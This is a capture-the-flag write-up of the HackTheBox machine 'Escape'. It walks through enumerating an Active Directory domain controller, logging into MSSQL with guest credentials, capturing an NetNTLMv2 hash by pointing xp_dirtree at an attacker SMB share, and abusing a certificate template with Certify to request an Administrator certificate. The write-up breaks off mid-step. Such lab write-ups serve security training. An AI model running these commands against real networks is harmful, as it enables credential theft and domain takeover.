 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/a6fb8ca3-0dd2-485d-8973-e9a1ca182bb7)
  https://app.hackthebox.com/machines/Escape
  
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Enumeration:

### Port scan:

I began the enumeration process by performing a quick port scan using rustscan, which revealed multiple open ports on the target machine:

```
sudo rustscan -a 10.10.11.202 -- -sC -sV -vv -oN escape_nmap
```

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/ebf974f6-b903-43f1-bffb-5b29e5bba465)

```
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2023-05-14 16:53:37Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Issuer: commonName=sequel-DC-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-11-18T21:20:35
| Not valid after:  2023-11-18T21:20:35
| MD5:   869f 7f54 b2ed ff74 708d 1a6d df34 b9bd
| SHA-1: 742a b452 2191 3317 6739 5039 db9b 3b2e 27b6 f7fa
| -----BEGIN CERTIFICATE-----
| MIIFyzCCBLOgAwIBAgITHgAAAASQUnv8kTh0LwAAAAAABDANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjIxMTE4MjEyMDM1WhcNMjMxMTE4
| MjEyMDM1WjAYMRYwFAYDVQQDEw1kYy5zZXF1ZWwuaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEAppJ4qi7+By/k2Yjy1J83ZJ1z/spO74W9tUZwPfgv
| mDj0KBf4FR3IN9GtLgjVX6CHwTtez8kdl2tc58HB8o9B4myaKjzhKmRX10eYaSe0
| icT5fZUoLDxCUz4ou/fbtM3AUtPEXKBokuBni+x8wM2XpUXRznXWPL3wqQFsB91p
| Mub1Zz/Kmey3EZgxT43PdPY4CZJwDvpIUeXg293HG1r/yMqX31AZ4ePLeNYDpYzo
| fKg4C5K/2maN+wTTZ1t6ARiqAWBQrxFRTH6vTOoT6NF+6HxALXFxxWw/7OrfJ4Wl
| 5Y5ui1H5vWS1ernVPE98aiJje3B5mTsPczw7oKBFEdszRQIDAQABo4IC4DCCAtww
| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUIuJgX6Ee95CeVip7
| lbtMDt5sWIcwHwYDVR0jBBgwFoAUYp8yo6DwOCDUYMDNbcX6UTBewxUwgcQGA1Ud
| HwSBvDCBuTCBtqCBs6CBsIaBrWxkYXA6Ly8vQ049c2VxdWVsLURDLUNBLENOPWRj
| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPXNlcXVlbCxEQz1odGI/Y2VydGlmaWNhdGVSZXZv
| Y2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50
| MIG9BggrBgEFBQcBAQSBsDCBrTCBqgYIKwYBBQUHMAKGgZ1sZGFwOi8vL0NOPXNl
| cXVlbC1EQy1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049
| U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1zZXF1ZWwsREM9aHRiP2NBQ2Vy
| dGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5
| MDkGA1UdEQQyMDCgHwYJKwYBBAGCNxkBoBIEENIKdyhMrBRIsqTPzAbls0uCDWRj
| LnNlcXVlbC5odGIwDQYJKoZIhvcNAQELBQADggEBAJLkSygHvC+jUd6MD07n6vN+
| /VbEboj++2qaUZjrXcZJf24t85ETixEmwP+xjsvuw8ivxV+OrPEZsipJ7cwPjxed
| RcwjpeXyq7+FszZR9Q/QwgMGhwpWCLVg/e7I9HiEORu/acH5AIOsXp0oTB7N9rMC
| frCIs3KAU990pyV+JhzfseVjJiiXmKeivvvLJuknwYmulanleOZSWlljckXWz29r
| nKQfODM1CJN7sWoNGN+H3hVlQzJihM8qm9NO1PLinpUkPAq5JovsOvr75ZOvIgSb
| Ea0hY7tIoQdoEwbZMSMCQDdOSlpI6fjJge10vCZp/YUgSL8bgtzttCGYN92LKrQ=
|_-----END CERTIFICATE-----
|_ssl-date: 2023-05-14T16:55:09+00:00; +8h00m05s from scanner time.
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Issuer: commonName=sequel-DC-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-11-18T21:20:35
| Not valid after:  2023-11-18T21:20:35
| MD5:   869f 7f54 b2ed ff74 708d 1a6d df34 b9bd
| SHA-1: 742a b452 2191 3317 6739 5039 db9b 3b2e 27b6 f7fa
| -----BEGIN CERTIFICATE-----
| MIIFyzCCBLOgAwIBAgITHgAAAASQUnv8kTh0LwAAAAAABDANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjIxMTE4MjEyMDM1WhcNMjMxMTE4
| MjEyMDM1WjAYMRYwFAYDVQQDEw1kYy5zZXF1ZWwuaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEAppJ4qi7+By/k2Yjy1J83ZJ1z/spO74W9tUZwPfgv
| mDj0KBf4FR3IN9GtLgjVX6CHwTtez8kdl2tc58HB8o9B4myaKjzhKmRX10eYaSe0
| icT5fZUoLDxCUz4ou/fbtM3AUtPEXKBokuBni+x8wM2XpUXRznXWPL3wqQFsB91p
| Mub1Zz/Kmey3EZgxT43PdPY4CZJwDvpIUeXg293HG1r/yMqX31AZ4ePLeNYDpYzo
| fKg4C5K/2maN+wTTZ1t6ARiqAWBQrxFRTH6vTOoT6NF+6HxALXFxxWw/7OrfJ4Wl
| 5Y5ui1H5vWS1ernVPE98aiJje3B5mTsPczw7oKBFEdszRQIDAQABo4IC4DCCAtww
| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUIuJgX6Ee95CeVip7
| lbtMDt5sWIcwHwYDVR0jBBgwFoAUYp8yo6DwOCDUYMDNbcX6UTBewxUwgcQGA1Ud
| HwSBvDCBuTCBtqCBs6CBsIaBrWxkYXA6Ly8vQ049c2VxdWVsLURDLUNBLENOPWRj
| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPXNlcXVlbCxEQz1odGI/Y2VydGlmaWNhdGVSZXZv
| Y2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50
| MIG9BggrBgEFBQcBAQSBsDCBrTCBqgYIKwYBBQUHMAKGgZ1sZGFwOi8vL0NOPXNl
| cXVlbC1EQy1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049
| U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1zZXF1ZWwsREM9aHRiP2NBQ2Vy
| dGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5
| MDkGA1UdEQQyMDCgHwYJKwYBBAGCNxkBoBIEENIKdyhMrBRIsqTPzAbls0uCDWRj
| LnNlcXVlbC5odGIwDQYJKoZIhvcNAQELBQADggEBAJLkSygHvC+jUd6MD07n6vN+
| /VbEboj++2qaUZjrXcZJf24t85ETixEmwP+xjsvuw8ivxV+OrPEZsipJ7cwPjxed
| RcwjpeXyq7+FszZR9Q/QwgMGhwpWCLVg/e7I9HiEORu/acH5AIOsXp0oTB7N9rMC
| frCIs3KAU990pyV+JhzfseVjJiiXmKeivvvLJuknwYmulanleOZSWlljckXWz29r
| nKQfODM1CJN7sWoNGN+H3hVlQzJihM8qm9NO1PLinpUkPAq5JovsOvr75ZOvIgSb
| Ea0hY7tIoQdoEwbZMSMCQDdOSlpI6fjJge10vCZp/YUgSL8bgtzttCGYN92LKrQ=
|_-----END CERTIFICATE-----
|_ssl-date: 2023-05-14T16:55:10+00:00; +8h00m05s from scanner time.
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Issuer: commonName=sequel-DC-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-11-18T21:20:35
| Not valid after:  2023-11-18T21:20:35
| MD5:   869f 7f54 b2ed ff74 708d 1a6d df34 b9bd
| SHA-1: 742a b452 2191 3317 6739 5039 db9b 3b2e 27b6 f7fa
| -----BEGIN CERTIFICATE-----
| MIIFyzCCBLOgAwIBAgITHgAAAASQUnv8kTh0LwAAAAAABDANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjIxMTE4MjEyMDM1WhcNMjMxMTE4
| MjEyMDM1WjAYMRYwFAYDVQQDEw1kYy5zZXF1ZWwuaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEAppJ4qi7+By/k2Yjy1J83ZJ1z/spO74W9tUZwPfgv
| mDj0KBf4FR3IN9GtLgjVX6CHwTtez8kdl2tc58HB8o9B4myaKjzhKmRX10eYaSe0
| icT5fZUoLDxCUz4ou/fbtM3AUtPEXKBokuBni+x8wM2XpUXRznXWPL3wqQFsB91p
| Mub1Zz/Kmey3EZgxT43PdPY4CZJwDvpIUeXg293HG1r/yMqX31AZ4ePLeNYDpYzo
| fKg4C5K/2maN+wTTZ1t6ARiqAWBQrxFRTH6vTOoT6NF+6HxALXFxxWw/7OrfJ4Wl
| 5Y5ui1H5vWS1ernVPE98aiJje3B5mTsPczw7oKBFEdszRQIDAQABo4IC4DCCAtww
| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUIuJgX6Ee95CeVip7
| lbtMDt5sWIcwHwYDVR0jBBgwFoAUYp8yo6DwOCDUYMDNbcX6UTBewxUwgcQGA1Ud
| HwSBvDCBuTCBtqCBs6CBsIaBrWxkYXA6Ly8vQ049c2VxdWVsLURDLUNBLENOPWRj
| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPXNlcXVlbCxEQz1odGI/Y2VydGlmaWNhdGVSZXZv
| Y2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50
| MIG9BggrBgEFBQcBAQSBsDCBrTCBqgYIKwYBBQUHMAKGgZ1sZGFwOi8vL0NOPXNl
| cXVlbC1EQy1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049
| U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1zZXF1ZWwsREM9aHRiP2NBQ2Vy
| dGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5
| MDkGA1UdEQQyMDCgHwYJKwYBBAGCNxkBoBIEENIKdyhMrBRIsqTPzAbls0uCDWRj
| LnNlcXVlbC5odGIwDQYJKoZIhvcNAQELBQADggEBAJLkSygHvC+jUd6MD07n6vN+
| /VbEboj++2qaUZjrXcZJf24t85ETixEmwP+xjsvuw8ivxV+OrPEZsipJ7cwPjxed
| RcwjpeXyq7+FszZR9Q/QwgMGhwpWCLVg/e7I9HiEORu/acH5AIOsXp0oTB7N9rMC
| frCIs3KAU990pyV+JhzfseVjJiiXmKeivvvLJuknwYmulanleOZSWlljckXWz29r
| nKQfODM1CJN7sWoNGN+H3hVlQzJihM8qm9NO1PLinpUkPAq5JovsOvr75ZOvIgSb
| Ea0hY7tIoQdoEwbZMSMCQDdOSlpI6fjJge10vCZp/YUgSL8bgtzttCGYN92LKrQ=
|_-----END CERTIFICATE-----
|_ssl-date: 2023-05-14T16:55:09+00:00; +8h00m05s from scanner time.
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Issuer: commonName=sequel-DC-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-11-18T21:20:35
| Not valid after:  2023-11-18T21:20:35
| MD5:   869f 7f54 b2ed ff74 708d 1a6d df34 b9bd
| SHA-1: 742a b452 2191 3317 6739 5039 db9b 3b2e 27b6 f7fa
| -----BEGIN CERTIFICATE-----
| MIIFyzCCBLOgAwIBAgITHgAAAASQUnv8kTh0LwAAAAAABDANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjIxMTE4MjEyMDM1WhcNMjMxMTE4
| MjEyMDM1WjAYMRYwFAYDVQQDEw1kYy5zZXF1ZWwuaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEAppJ4qi7+By/k2Yjy1J83ZJ1z/spO74W9tUZwPfgv
| mDj0KBf4FR3IN9GtLgjVX6CHwTtez8kdl2tc58HB8o9B4myaKjzhKmRX10eYaSe0
| icT5fZUoLDxCUz4ou/fbtM3AUtPEXKBokuBni+x8wM2XpUXRznXWPL3wqQFsB91p
| Mub1Zz/Kmey3EZgxT43PdPY4CZJwDvpIUeXg293HG1r/yMqX31AZ4ePLeNYDpYzo
| fKg4C5K/2maN+wTTZ1t6ARiqAWBQrxFRTH6vTOoT6NF+6HxALXFxxWw/7OrfJ4Wl
| 5Y5ui1H5vWS1ernVPE98aiJje3B5mTsPczw7oKBFEdszRQIDAQABo4IC4DCCAtww
| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUIuJgX6Ee95CeVip7
| lbtMDt5sWIcwHwYDVR0jBBgwFoAUYp8yo6DwOCDUYMDNbcX6UTBewxUwgcQGA1Ud
| HwSBvDCBuTCBtqCBs6CBsIaBrWxkYXA6Ly8vQ049c2VxdWVsLURDLUNBLENOPWRj
| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPXNlcXVlbCxEQz1odGI/Y2VydGlmaWNhdGVSZXZv
| Y2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50
| MIG9BggrBgEFBQcBAQSBsDCBrTCBqgYIKwYBBQUHMAKGgZ1sZGFwOi8vL0NOPXNl
| cXVlbC1EQy1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049
| U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1zZXF1ZWwsREM9aHRiP2NBQ2Vy
| dGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5
| MDkGA1UdEQQyMDCgHwYJKwYBBAGCNxkBoBIEENIKdyhMrBRIsqTPzAbls0uCDWRj
| LnNlcXVlbC5odGIwDQYJKoZIhvcNAQELBQADggEBAJLkSygHvC+jUd6MD07n6vN+
| /VbEboj++2qaUZjrXcZJf24t85ETixEmwP+xjsvuw8ivxV+OrPEZsipJ7cwPjxed
| RcwjpeXyq7+FszZR9Q/QwgMGhwpWCLVg/e7I9HiEORu/acH5AIOsXp0oTB7N9rMC
| frCIs3KAU990pyV+JhzfseVjJiiXmKeivvvLJuknwYmulanleOZSWlljckXWz29r
| nKQfODM1CJN7sWoNGN+H3hVlQzJihM8qm9NO1PLinpUkPAq5JovsOvr75ZOvIgSb
| Ea0hY7tIoQdoEwbZMSMCQDdOSlpI6fjJge10vCZp/YUgSL8bgtzttCGYN92LKrQ=
|_-----END CERTIFICATE-----
|_ssl-date: 2023-05-14T16:55:10+00:00; +8h00m05s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49689/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49706/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49714/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
63532/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 8h00m04s, deviation: 0s, median: 8h00m04s
| ms-sql-info: 
|   10.10.11.202:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 63970/tcp): CLEAN (Timeout)
|   Check 2 (port 32091/tcp): CLEAN (Timeout)
|   Check 3 (port 50586/udp): CLEAN (Timeout)
|   Check 4 (port 23813/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-05-14T16:54:30
|_  start_date: N/A
```
Upon analyzing the port scan results, I discovered the presence of a Domain Controller (DC) running on the machine. To facilitate access, I added the identified domains to my /etc/hosts configuration:

sequel.htb
dc.sequel.htb

Additionally, I noticed that the machine is running "Microsoft SQL Server 2019 RTM" as the operating system.

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

### DNS enumeration:

Continuing the enumeration, I proceeded to check for other servers/domains listed in the DNS.

```
dig sequel.htb any @10.10.11.202
```
The dig command provided the following response:

```
; <<>> DiG 9.18.12-1-Debian <<>> sequel.htb any @10.10.11.202
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 57532
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 0, ADDITIONAL: 4

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;sequel.htb.                    IN      ANY

;; ANSWER SECTION:
sequel.htb.             600     IN      A       10.10.11.202
sequel.htb.             3600    IN      NS      dc.sequel.htb.
sequel.htb.             3600    IN      SOA     dc.sequel.htb. hostmaster.sequel.htb. 162 900 600 86400 3600
sequel.htb.             600     IN      AAAA    dead:beef::1dc
sequel.htb.             600     IN      AAAA    dead:beef::c7c:7944:f15:15eb

;; ADDITIONAL SECTION:
dc.sequel.htb.          1200    IN      A       10.10.11.202
dc.sequel.htb.          1200    IN      AAAA    dead:beef::c7c:7944:f15:15eb
dc.sequel.htb.          1200    IN      AAAA    dead:beef::1dc

;; Query time: 168 msec
;; SERVER: 10.10.11.202#53(10.10.11.202) (TCP)
;; WHEN: Mon May 15 02:57:40 EDT 2023
;; MSG SIZE  rcvd: 247
```

```
dig sequel.htb any @10.10.11.202 -t NS
```
The second dig command yielded the following result:

```
;; Warning, extra type option

; <<>> DiG 9.18.12-1-Debian <<>> sequel.htb any @10.10.11.202 -t NS
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 47171
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 4

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;sequel.htb.                    IN      NS

;; ANSWER SECTION:
sequel.htb.             3600    IN      NS      dc.sequel.htb.

;; ADDITIONAL SECTION:
dc.sequel.htb.          3600    IN      A       10.10.11.202
dc.sequel.htb.          3600    IN      AAAA    dead:beef::c7c:7944:f15:15eb
dc.sequel.htb.          3600    IN      AAAA    dead:beef::1dc

;; Query time: 164 msec
;; SERVER: 10.10.11.202#53(10.10.11.202) (TCP)
;; WHEN: Mon May 15 03:06:41 EDT 2023
;; MSG SIZE  rcvd: 128
```

During the DNS enumeration, I came across another domain in the results: "hostmaster.sequel.htb". Consequently, I added this domain to the hosts file for further reference.

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

### SMB enumeration:

After conducting the port scan and performing DNS analysis, I proceeded with enumerating the network shares.

```
smbmap -H dc.sequel.htb -u DoesNotExist
```

The smbmap command revealed two network shares with read access: IPC$ and Public.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/b6657364-30d4-4f2a-ad4a-b682d43ba893)

Within the Public directory, I discovered a file named "SQL Server Procedures.pdf" and downloaded it to my attacking machine.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/dc65bd3f-15d4-48ca-950c-17b29975b92e)

The PDF contained information about a user named "brandon.brown" and the Guest credentials to access the SQL database. Additionally, it provided a command to access the database from non-domain joined devices:

```
cmdkey /add:"<serverName>.sequel.htb" /user:"sequel\<userame>" /pass:<password>
```

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/bba335af-4054-4159-976f-3373c4075573)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

### User enumeration with CME:

After examining the network shares, it's time to gather information about domain users. I utilized the **rid-brute** option in CrackMapExec for this purpose:

```
crackmapexec smb sequel.htb -u "guest" -p "" --rid-brute
```
The results yielded numerous domain users:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/882f92b2-ee31-4513-a7d6-cc2c825ebdb8)

Using the obtained credentials, I attempted AS-REP roasting to identify any accounts that "Do not require Kerberos pre-authentication." However, it appears that all the accounts require pre-authentication. 😕

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/86abd543-ff8b-4d01-ae17-6df0d9c339dc)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Intital access:

Using the Guest credentials, I attempted to access the SQL server using the Impacket script "mssqlclient.py":

```
python3 mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202
```

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/2484dbe1-8969-4d29-9f29-af964c8d7626)

Once inside the SQL server, I conducted a Google search and discovered that I could use the 'xp_dirtree' command to access remote files from shares. By starting an SMB server and directing the SQL server to my network share, there was a possibility that the service account would expose its hashed credentials during the authentication process.

I launched an SMBv2 server using another Impacket script and directed the SQL server to my SMB-enabled host. This exposed the NetNTLMv2 hash in the response:

```
python3 impacket/examples/smbserver.py kill3r . -smb2support
```

```
SQL> xp_dirtree '\\10.10.14.3\kill3r'
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/188f1598-1202-4267-9902-af0eab6b63bf)

I used 'hashcat' to crack the NetNTLMv2 hash and obtained the clear text password.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/c9043af9-e9bb-4cfa-8558-5c8e7bd7d0e7)

Finally, using the cracked credentials of the 'sql_svc' service account, I gained initial access to the host via Evil-WinRM: (pwn3d!🙂)

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/5e7a5fa4-db30-4090-a511-5b56444e7d2b)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

### User.txt:

Although I had gained access to the network, I had not yet obtained the user flag. While conducting enumeration under the 'sql_svc' account, I noticed a folder called 'SQLServer' on the 'C:' drive. Within this folder, there was a 'Logs' directory containing error logs related to users.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/6cdbf1bf-db3f-484b-a4e3-36acc9a58f8e)

In one of the log files, I discovered the credentials of the user 'Ryan.Cooper':

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/77a90705-53ab-4105-9abe-6e1c57236a3c)

With the obtained credentials, I successfully logged in as Ryan and obtained the user flag. (pwn3d!🙂)

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/ff2355e2-fed3-4165-9006-a5e7ce7fa3a4)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Privilege Escalation:

In order to obtain the root flag, I needed to elevate my privileges from Ryan to the Administrator user. I started by running Winpeas, but it didn't provide any useful information for privilege escalation.

Since the initial approach didn't yield any results, I decided to explore vulnerable certificates as a potential vector for impersonating the Administrator user. I used 'Certify' tool for enumerating and exploiting vulnerable certificates, following this [guide](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin).

To perform the enumeration and exploitation, I downloaded the compiled 'Certify.exe' from this [GitHub repository](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries).

For searching vulnerable certificates, I used the following command:

```
.\certify.exe find /vulnerable /currentuser
```

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/96848b2e-ec6e-48ed-bf55-4d82c2b19a05)

Following the guide, I needed to request a new certificate on behalf of a domain administrator using Certify. I specified the following parameters:

```
 - /ca - speciffies the Certificate Authority server we're sending the request to;
 - /template - specifies the certificate template that should be used for generating the new certificate;
 - /altname - specifies the AD user for which the new certificate should be generated.
 
 certify.exe request /ca:<$certificateAuthorityHost> /template:UserAuthentication  /altname:Administrator
```

```
.\certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator
```
From the Certify results, it can be seen that the certificate in PEM format has been successfully issued:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/06511bbe-11a1-4025-9ff9-a6e152e5ef29)
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/8f7a08ac-bdde-4dea-82bc-91d6138f79a3)

Next, I needed to convert the certificate from PEM to PFX format. I saved the certificate in a file named cert.pem on my attack box and executed the following command:

```
